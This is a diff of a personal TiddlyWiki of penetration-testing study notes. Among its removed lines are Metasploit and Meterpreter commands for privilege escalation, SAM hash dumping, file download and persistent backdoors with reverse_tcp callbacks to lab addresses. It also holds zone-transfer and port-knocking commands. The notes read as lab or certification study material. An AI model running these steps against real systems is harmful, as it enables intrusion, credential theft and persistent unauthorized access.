@@ -479,8 +479,6 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Domain Name System</li>
 
-<li>Draft of 'Exploitation'</li>
-
 <li>Draft of 'LinEnum'</li>
 
 <li>Draft of 'Post Exploitation'</li>
@@ -10077,7 +10075,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211208113239359" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Draft of 'Exploitation']] Metasploit" modified="20211208150738678" title="$:/StoryList">
+<div created="20211208113239359" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Post Exploitation]]" modified="20211208151016849" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11954,31 +11952,6 @@ Enumerate the host. Use domain names such as those
 dig axfr @10.10.10.13 cronos.htb
 ```</pre>
 </div>
-<div created="20210904163141554" draft.of="Exploitation" draft.title="Exploitation" modified="20211208150734893" title="Draft of 'Exploitation'">
-<pre>! Main ways of Exploitation
-
-# [[Web Hacking]]
-
-Credentials
-
-# [[Password Cracking]]
-# [[Default Credentials|https://docs.google.com/spreadsheets/d/1VdIXK5ORJJco0A08O9vmKH6o3rQmXjxWVWuVwI9FyH8/edit#gid=0]]
-
-Common Vulnerabilities and Explotis
-
-# [[Metasploit]]
-
-
-! Port Knocking
-
-Check `/etc/knockd.conf`
-
-```
-knock 192.168.1.8 7469 8475 9842
-```
-
-</pre>
-</div>
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
 </div>
@@ -12003,13 +11976,20 @@ Check my [[Youtube Channel|https://www.youtube.com/channel/UChDzBIt2yj4aGUKpPnjj
 
 Check my other youtube channel, the one with the Kimetsu no Yaiba OP Electone Cover</pre>
 </div>
-<div created="20210904163141554" modified="20211208150446321" title="Exploitation">
-<pre>! Other ways of Exploitation
+<div created="20210904163141554" modified="20211208150747737" title="Exploitation">
+<pre>! Main ways of Exploitation
 
 # [[Web Hacking]]
+
+Credentials
+
 # [[Password Cracking]]
 # [[Default Credentials|https://docs.google.com/spreadsheets/d/1VdIXK5ORJJco0A08O9vmKH6o3rQmXjxWVWuVwI9FyH8/edit#gid=0]]
+
+Common Vulnerabilities and Explotis
+
 # [[Metasploit]]
+
 
 ! Port Knocking
 
@@ -12019,73 +11999,7 @@ Check `/etc/knockd.conf`
 knock 192.168.1.8 7469 8475 9842
 ```
 
-! Metasploit
-
-Google all services and Find related Issues
-Metasploit msfconsole
-
-```
-search &lt;keyword&gt;
-use &lt;module&gt;
-show options
-set VAR &lt;value&gt;
-exploit
-```
-
-!! Meterpreter
-
-```
- background
- session -l # Lists your open sessions
- sessions -i 3 # Interact with/ open/ enter session 3
- getsystem # PrivEsc for Windows
- sysinfo, ifconfig, route, getuid # Internal Enumeration
- search -f file.txt
- download thisFile.txt /in/my/directory/here # Also has upload
- hashdump # Dumps Windows SAM password hashes  
- shell
-```
-
-If cannot bypass UAC for PrivEsc, use `exploit/windows/local/bypassuac` module, which only needs the meterpreter session
-VPN have to be connectged in VM to use VM's metasploit to exploit
-
-!!! Persistence
-
-Windows Vista and Above
-
-```
-# persistent backdoor - need meterpreter session
-msf &gt; use exploit/windows/local/s4u_persistence
-msf (s4u_persistence) &gt; set session 2
-#session =&gt; 2
-msf (s4u_persistence) &gt; set trigger logon
-#trigger =&gt; logon
-msf (s4u_persistence) &gt; set payload windows/meterpreter/reverse_tcp
-msf (s4u_persistence) &gt; set lhost 1.2.3.4
-msf (s4u_persistence) &gt; set lport 1234
-msf (s4u_persistence) &gt; exploit
-```
-
-Others
-
-```
-use exploit/windows/local/persistence
-set reg_name backdoor
-set exe_name backdoor
-set startup SYSTEM
-set session 1
-set payload windows/meterpreter/reverse_tcp
-set exitfunc process
-set lhost 192.168.99.100
-set lport 5555
-set DisablePayloadHandler false
-exploit //if the backdoor doesn't start immediately, use &quot;exploit -j&quot; instead
-Connecting to backdoor
-msf (s4u_persistence) &gt; use exploit/multi/handler
-msf (handler) &gt; set payload windows/meterpreter/reverse_tcp
-msf (handler) &gt; exploit
-# once victim restarts and logons, we will get a meterpreter shell
-```</pre>
+</pre>
 </div>
 <div created="20211002174442005" modified="20211029121721190" title="File Transfers">
 <pre>! Server
@@ -13095,7 +13009,7 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ### Change (not add, It will pick the first proxy server) the last line to `socks4 127.0.0.1 1080`
 ## `proxychains4 &lt;command&gt;`</pre>
 </div>
-<div created="20211205085540773" modified="20211206170725159" title="Post Exploitation">
+<div created="20211205085540773" modified="20211208151043703" title="Post Exploitation">
 <pre>https://attack.stealthbits.com/how-golden-ticket-attack-works
 
 
@@ -13105,7 +13019,13 @@ https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 
-https://sushant747.gitbooks.io/total-oscp-guide/content/loot_windows_-_for_credentials_and_other_stuff.html</pre>
+https://sushant747.gitbooks.io/total-oscp-guide/content/loot_windows_-_for_credentials_and_other_stuff.html
+
+[[Active Directory]]
+
+[[Active Directory Exploitation]]
+
+</pre>
 </div>
 <div created="20211014102800712" modified="20211027143743443" title="Privesc - Linux Binaries">
 <pre>https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
